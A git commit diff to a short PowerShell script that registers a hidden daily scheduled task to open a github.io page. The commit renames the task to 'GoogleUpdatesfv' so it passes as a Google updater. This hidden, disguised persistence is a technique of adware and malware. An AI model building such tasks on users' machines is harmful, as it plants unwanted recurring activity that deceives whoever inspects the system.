0346ebb4d0b293ff9643e99f6cd10e93963ca667
luigit12 <58264257+Luigit12@users.noreply.github.com>
2021-04-02 11:50:37 +0200

    Update scheduler.ps1

--- scheduler.ps1
+++ scheduler.ps1
@@ -1,4 +1,4 @@
 $settings = New-ScheduledTaskSettingsSet -Hidden
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Start-Process https://Luigit12.github.io"
 $trigger = New-ScheduledTaskTrigger -Daily -At 11:00
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'b' -Settings $settings
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'GoogleUpdatesfv' -Settings $settings
